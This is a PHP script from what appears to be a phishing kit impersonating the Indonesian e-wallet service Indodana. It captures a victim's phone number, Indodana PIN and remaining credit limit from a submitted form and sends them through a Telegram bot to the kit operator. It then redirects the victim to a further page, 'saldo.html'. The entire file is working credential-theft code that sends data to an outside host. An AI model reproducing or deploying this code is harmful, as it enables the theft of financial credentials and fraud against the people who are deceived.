<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorku"] = $_POST ['nomorku'];
$_SESSION["debit"] = $_POST ['debit'];
$_SESSION["nama"] = $_POST ['nama'];

$message = "❁┷━❃∞𝗜𝗻𝗱𝗼𝗱𝗮𝗻𝗮∞❃━┷❁". "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n".  $_POST ['nomor']. "\n𝗣𝗜𝗡 𝗜𝗻𝗱𝗼𝗱𝗮𝗻𝗮 : \n". $_POST ['pin']. "\n𝗦𝗶𝘀𝗮 𝗟𝗶𝗺𝗶𝘁 : \n". $_POST ['saldo'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  saldo.html");
?> 